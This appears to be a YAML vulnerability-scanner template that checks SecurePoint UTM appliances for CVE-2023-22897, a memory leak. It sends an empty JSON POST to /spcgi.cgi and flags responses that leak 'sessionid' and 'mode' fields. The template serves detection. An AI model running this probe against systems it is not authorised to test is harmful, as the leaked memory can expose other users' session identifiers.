name: yaml-poc-securepoint-unified_threat_management-other-CVE-2023-22897
binding: 544cce83-9924-4db4-9df0-8c35232cdde5
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/171928/SecurePoint-UTM-12.x-Memory-Leak.html
        - http://seclists.org/fulldisclosure/2023/Apr/8
        - https://github.com/MrTuxracer/advisories/blob/master/CVEs/CVE-2023-22897.txt
        - https://rcesecurity.com
    vulnerability:
        id: 3f1d30cc-8493-41e7-ba04-0172fb08c423
        level: medium
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /spcgi.cgi
            headers:
                Content-Type: application/json
            body: |
                {}
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains('"sessionid":') && response.body_string.contains('"mode":') && response.content_type.contains("application/json")
expression: r0()
